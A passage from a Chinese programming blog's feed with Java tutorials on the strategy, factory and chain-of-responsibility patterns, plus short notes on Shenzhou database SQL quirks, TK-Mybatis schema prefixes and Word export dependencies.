        <content type="html"><![CDATA[<h1 id="策略模式和工厂模式的应用"><a href="#策略模式和工厂模式的应用" class="headerlink" title="策略模式和工厂模式的应用"></a>策略模式和工厂模式的应用</h1><p><strong>减少if-else</strong>的使用</p><h2 id="首先，定义一个策略接口，表示不同的价格计算策略："><a href="#首先，定义一个策略接口，表示不同的价格计算策略：" class="headerlink" title="首先，定义一个策略接口，表示不同的价格计算策略："></a>首先，定义一个策略接口，表示不同的价格计算策略：</h2><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Strategy</span> <span class="token punctuation">{</span>    <span class="token keyword">void</span> <span class="token function">apply</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="然后，实现不同的策略类，每个类负责实现一种具体的价格计算策略："><a href="#然后，实现不同的策略类，每个类负责实现一种具体的价格计算策略：" class="headerlink" title="然后，实现不同的策略类，每个类负责实现一种具体的价格计算策略："></a>然后，实现不同的策略类，每个类负责实现一种具体的价格计算策略：</h2><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">// 实现具体的策略</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ConditionOneStrategy</span> <span class="token keyword">implements</span> <span class="token class-name">Strategy</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">apply</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 实现价格计算逻辑</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"支付满15减1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 实现具体的策略</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ConditionTWOStrategy</span> <span class="token keyword">implements</span> <span class="token class-name">Strategy</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">apply</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 实现价格计算逻辑</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"支付满18减2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 其他策略类...</span></code></pre><h2 id="接下来，创建一个工厂类，用于创建对应的策略类对象："><a href="#接下来，创建一个工厂类，用于创建对应的策略类对象：" class="headerlink" title="接下来，创建一个工厂类，用于创建对应的策略类对象："></a>接下来，创建一个工厂类，用于创建对应的策略类对象：</h2><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">// 创建策略工厂</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">StrategyConditionFactory</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 保存条件和对应的策略</span>    <span class="token keyword">private</span> Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Strategy<span class="token operator">></span> conditions <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**     * 构造方法，初始化条件和对应的策略     */</span>    <span class="token keyword">public</span> <span class="token function">StrategyConditionFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        conditions<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"ConditionOne"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">ConditionOneStrategy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        conditions<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"ConditionTwo"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">ConditionTwoStrategy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 添加更多条件和对应的策略</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 根据条件获取对应的策略对象     * @param condition 条件     * @return Optional包装的策略对象，如果条件不存在对应的策略，则返回空的Optional     */</span>    <span class="token keyword">public</span> Optional<span class="token operator">&lt;</span>Strategy<span class="token operator">></span> <span class="token function">getStrategy</span><span class="token punctuation">(</span>String condition<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> Optional<span class="token punctuation">.</span><span class="token function">ofNullable</span><span class="token punctuation">(</span>conditions<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>condition<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><ul><li>最后，在主代码中使用策略模式和工厂模式来计算价格：</li></ul><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">// 使用策略模式和工厂模式</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">YourClass</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 创建一个私有的不可变的 StrategyConditionFactory 对象，用于生成策略条件</span>    <span class="token keyword">private</span> <span class="token keyword">final</span> StrategyConditionFactory strategyConditionFactory <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StrategyConditionFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**     * 根据给定的条件决定选择相应的策略进行执行     * @param someCondition 条件字符串     */</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">decide</span><span class="token punctuation">(</span>String someCondition<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Strategy strategy <span class="token operator">=</span> strategyConditionFactory<span class="token punctuation">.</span><span class="token function">getStrategy</span><span class="token punctuation">(</span>someCondition<span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">orElseThrow</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span><span class="token string">"Wrong condition"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        strategy<span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        YourClass yourClass <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">YourClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        yourClass<span class="token punctuation">.</span><span class="token function">decide</span><span class="token punctuation">(</span><span class="token string">"ConditionOne"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        yourClass<span class="token punctuation">.</span><span class="token function">decide</span><span class="token punctuation">(</span><span class="token string">"ConditionTwo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        yourClass<span class="token punctuation">.</span><span class="token function">decide</span><span class="token punctuation">(</span><span class="token string">"ConditionThree"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>通过使用策略模式和工厂模式，您可以将不同的价格计算逻辑封装到不同的策略类中，避免了if-else语句的冗长和复杂。同时，通过工厂模式，您可以根据具体的类型选择和创建对应的策略类，提高了代码的可扩展性和可维护性。</p>]]></content>
      
      
      <categories>
          
          <category> 设计模式 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 策略模式和工厂模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>责任链模式的应用</title>
      <link href="/2023/01/05/ze-ren-lian-mo-shi-de-ying-yong/"/>
      <url>/2023/01/05/ze-ren-lian-mo-shi-de-ying-yong/</url>
      
        <content type="html"><![CDATA[<h1 id="责任链模式的应用"><a href="#责任链模式的应用" class="headerlink" title="责任链模式的应用"></a>责任链模式的应用</h1><p>账号注册的时候需要判断校验用户输入的内容，利用责任链模式<strong>减少if-else</strong>条件判断。</p><h2 id="原始代码如下"><a href="#原始代码如下" class="headerlink" title="原始代码如下"></a>原始代码如下</h2><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">addUser</span><span class="token punctuation">(</span>User user<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 1.非空校验</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>StrUtil<span class="token punctuation">.</span><span class="token function">isBlank</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span><span class="token function">getUsername</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string">"用户名为空！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>StrUtil<span class="token punctuation">.</span><span class="token function">isBlank</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span><span class="token function">getPassword</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string">"密码为空！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 2.格式校验</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>ValidUtil<span class="token punctuation">.</span><span class="token function">isIdCardNo</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span><span class="token function">getIdCardNo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string">"身份证号格式错误！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>ValidUtil<span class="token punctuation">.</span><span class="token function">isEmail</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span><span class="token function">getEmail</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string">"手机号格式错误！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>ValidUtil<span class="token punctuation">.</span><span class="token function">isEmail</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span><span class="token function">getEmail</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string">"邮箱格式错误！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 3.要四素认证校验</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">doFourStampVerify</span><span class="token punctuation">(</span>User user<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>         <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string">"四要素认证失败！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//更多校验...</span><span class="token punctuation">}</span></code></pre><h2 id="运用责任链模式优化代码"><a href="#运用责任链模式优化代码" class="headerlink" title="运用责任链模式优化代码"></a>运用责任链模式优化代码</h2><h3 id="处理器链接口"><a href="#处理器链接口" class="headerlink" title="处理器链接口"></a>处理器链接口</h3><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/** * 处理器链接口 */</span><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">UserChainHandler</span> <span class="token punctuation">{</span>    <span class="token keyword">void</span> <span class="token function">handler</span><span class="token punctuation">(</span>User user<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="根据场景分别实现处理器链接口-注意要有-Component"><a href="#根据场景分别实现处理器链接口-注意要有-Component" class="headerlink" title="根据场景分别实现处理器链接口 注意要有@Component"></a>根据场景分别实现处理器链接口 <strong>注意要有@Component</strong></h3><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@Component</span><span class="token annotation punctuation">@Order</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 指定注入顺序</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UserParamNullValidChainHandler</span> <span class="token keyword">implements</span> <span class="token class-name">UserChainHandler</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">handler</span><span class="token punctuation">(</span>User user<span class="token punctuation">)</span> <span class="token punctuation">{</span>           <span class="token comment" spellcheck="true">// 1.非空校验</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>StrUtil<span class="token punctuation">.</span><span class="token function">isBlank</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span><span class="token function">getUsername</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string">"用户名为空！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>StrUtil<span class="token punctuation">.</span><span class="token function">isBlank</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span><span class="token function">getPassword</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string">"密码为空！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token annotation punctuation">@Component</span><span class="token annotation punctuation">@Order</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 指定注入顺序</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UserParamNullValidChainHandler</span> <span class="token keyword">implements</span> <span class="token class-name">UserChainHandler</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">handler</span><span class="token punctuation">(</span>User user<span class="token punctuation">)</span> <span class="token punctuation">{</span>           <span class="token comment" spellcheck="true">// 1.非空校验</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>StrUtil<span class="token punctuation">.</span><span class="token function">isBlank</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span><span class="token function">getUsername</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string">"用户名为空！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">/** * 格式校验处理器 */</span><span class="token annotation punctuation">@Component</span><span class="token annotation punctuation">@Order</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 指定注入顺序</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UserParamFormatValidChainHandler</span> <span class="token keyword">implements</span> <span class="token class-name">UserChainHandler</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">handler</span><span class="token punctuation">(</span>User user<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 2.格式校验</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>ValidUtil<span class="token punctuation">.</span><span class="token function">isIdCardNo</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span><span class="token function">getIdCardNo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string">"身份证号格式错误！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">/** * 四要素处理器 */</span><span class="token annotation punctuation">@Component</span><span class="token annotation punctuation">@Order</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 指定注入顺序</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">FourElementVerifyChainHandler</span> <span class="token keyword">implements</span> <span class="token class-name">UserChainHandler</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">handler</span><span class="token punctuation">(</span>User user<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 2.格式校验</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">doFourStampVerify</span><span class="token punctuation">(</span>User user<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string">"四要素认证失败！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="进行组装"><a href="#进行组装" class="headerlink" title="进行组装"></a>进行组装</h3><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@Component</span><span class="token annotation punctuation">@RequiredArgsConstructor</span><span class="token comment" spellcheck="true">//生成一个包含所有标记为final的字段的构造函数参数，并在构造函数中对这些字段进行初始化</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UserChainContext</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">final</span> List<span class="token operator">&lt;</span>UserChainHandler<span class="token operator">></span> userChainHandlerList<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 自动注入责任链处理器</span>    <span class="token comment" spellcheck="true">/**     * 责任链组件执行     * @param user 请求参数     */</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">handler</span><span class="token punctuation">(</span>User user<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 此处根据 Ordered 实际值进行排序处理</span>        userChainHandlerList<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>x <span class="token operator">-</span><span class="token operator">></span> x<span class="token punctuation">.</span><span class="token function">handler</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="修改原始代码，执行责任链"><a href="#修改原始代码，执行责任链" class="headerlink" title="修改原始代码，执行责任链"></a>修改原始代码，执行责任链</h3><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">addUser</span><span class="token punctuation">(</span>User user<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 执行责任链</span>    userChainContext<span class="token punctuation">.</span><span class="token function">handler</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h1 id><a href="#" class="headerlink" title></a></h1>]]></content>
      
      
      <categories>
          
          <category> 设计模式 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 责任链模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>单例模式的应用</title>
      <link href="/2023/01/02/dan-li-mo-shi-de-ying-yong/"/>
      <url>/2023/01/02/dan-li-mo-shi-de-ying-yong/</url>
      
        <content type="html"><![CDATA[<h1 id="单例模式"><a href="#单例模式" class="headerlink" title="单例模式"></a>单例模式</h1><p><a href="https://blog.ktdaddy.com/pages/10eba0/">https://blog.ktdaddy.com/pages/10eba0/</a></p>]]></content>
      
      
      <categories>
          
          <category> 设计模式 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 单例模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>神州数据库踩坑</title>
      <link href="/2022/12/23/shen-zhou-shu-ju-ku-cai-keng/"/>
      <url>/2022/12/23/shen-zhou-shu-ju-ku-cai-keng/</url>
      
        <content type="html"><![CDATA[<h1 id="神州数据库踩坑"><a href="#神州数据库踩坑" class="headerlink" title="神州数据库踩坑"></a>神州数据库踩坑</h1><pre class=" language-sql"><code class="language-sql"> <span class="token keyword">select</span> id<span class="token punctuation">,</span><span class="token punctuation">`</span>year<span class="token punctuation">`</span><span class="token punctuation">,</span> money_num moneyNum<span class="token punctuation">,</span><span class="token keyword">percent</span>  <span class="token keyword">from</span> YQFX_SYSTEM<span class="token punctuation">.</span>screen_land_thousand  <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> CAST<span class="token punctuation">(</span> year <span class="token keyword">AS</span> <span class="token keyword">DECIMAL</span><span class="token punctuation">)</span> <span class="token keyword">ASC</span></code></pre><p>这里的字段与mysql不同，不能加`符号</p><p>自定义排序函数FIELD无法识别,如下：</p><pre><code>ORDER BY FIELD(monthNum, &#39;1月&#39;, &#39;2月&#39;, &#39;3月&#39;,&#39;4月&#39;,&#39;5月&#39;,&#39;6月&#39;,&#39;7月&#39;,&#39;8月&#39;,&#39;9月&#39;,&#39;10月&#39;,&#39;11月&#39;,&#39;12月&#39;)</code></pre><p>改成</p><pre class=" language-sql"><code class="language-sql"> <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> <span class="token keyword">CASE</span>        <span class="token keyword">WHEN</span> monthNum <span class="token operator">=</span> <span class="token string">'1月'</span> <span class="token keyword">THEN</span> <span class="token number">1</span>        <span class="token keyword">WHEN</span> monthNum <span class="token operator">=</span> <span class="token string">'2月'</span> <span class="token keyword">THEN</span> <span class="token number">2</span>        <span class="token keyword">WHEN</span> monthNum <span class="token operator">=</span> <span class="token string">'3月'</span> <span class="token keyword">THEN</span> <span class="token number">3</span>        <span class="token keyword">WHEN</span> monthNum <span class="token operator">=</span> <span class="token string">'4月'</span> <span class="token keyword">THEN</span> <span class="token number">4</span>        <span class="token keyword">WHEN</span> monthNum <span class="token operator">=</span> <span class="token string">'5月'</span> <span class="token keyword">THEN</span> <span class="token number">5</span>        <span class="token keyword">WHEN</span> monthNum <span class="token operator">=</span> <span class="token string">'6月'</span> <span class="token keyword">THEN</span> <span class="token number">6</span>        <span class="token keyword">WHEN</span> monthNum <span class="token operator">=</span> <span class="token string">'7月'</span> <span class="token keyword">THEN</span> <span class="token number">7</span>        <span class="token keyword">WHEN</span> monthNum <span class="token operator">=</span> <span class="token string">'8月'</span> <span class="token keyword">THEN</span> <span class="token number">8</span>        <span class="token keyword">WHEN</span> monthNum <span class="token operator">=</span> <span class="token string">'9月'</span> <span class="token keyword">THEN</span> <span class="token number">9</span>        <span class="token keyword">WHEN</span> monthNum <span class="token operator">=</span> <span class="token string">'10月'</span> <span class="token keyword">THEN</span> <span class="token number">10</span>        <span class="token keyword">WHEN</span> monthNum <span class="token operator">=</span> <span class="token string">'11月'</span> <span class="token keyword">THEN</span> <span class="token number">11</span>        <span class="token keyword">WHEN</span> monthNum <span class="token operator">=</span> <span class="token string">'12月'</span> <span class="token keyword">THEN</span> <span class="token number">12</span>        <span class="token keyword">ELSE</span> <span class="token number">13</span>        <span class="token keyword">END</span></code></pre><h1 id><a href="#" class="headerlink" title></a></h1>]]></content>
      
      
      <categories>
          
          <category> bug记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 神州数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TK-Mybatis表前缀</title>
      <link href="/2022/10/03/tkmybatis-biao-qian-zhui/"/>
      <url>/2022/10/03/tkmybatis-biao-qian-zhui/</url>
      
        <content type="html"><![CDATA[<h1 id="TKMybatis表前缀"><a href="#TKMybatis表前缀" class="headerlink" title="TKMybatis表前缀"></a>TKMybatis表前缀</h1><p>加上schema = “YQFX_SYSTEM”  查询预警的表名会加上库名。YQFX_SYSTEM.screen_yq_report_record</p><p>如：</p><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@Table</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"screen_yq_report_record"</span><span class="token punctuation">,</span>schema <span class="token operator">=</span> <span class="token string">"YQFX_SYSTEM"</span><span class="token punctuation">)</span></code></pre><h1 id><a href="#" class="headerlink" title></a></h1>]]></content>
      
      
      <categories>
          
          <category> TK.Mybatis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TK.Mybatis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Word插入图片和文本</title>
      <link href="/2022/06/06/word-cha-ru-tu-pian-he-wen-ben/"/>
      <url>/2022/06/06/word-cha-ru-tu-pian-he-wen-ben/</url>
      
        <content type="html"><![CDATA[<h1 id="Word插入图片和文本"><a href="#Word插入图片和文本" class="headerlink" title="Word插入图片和文本"></a>Word插入图片和文本</h1><h2 id="相关依赖"><a href="#相关依赖" class="headerlink" title="相关依赖"></a>相关依赖</h2><pre class=" language-xml"><code class="language-xml">        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.poi<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>poi-ooxml<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>5.2.2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!--        导出Word--></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.deepoove<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>poi-tl<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.12.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!--        Word转PDF--></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.aspose<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>aspose-words<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>21.11<span class="token tag"><span 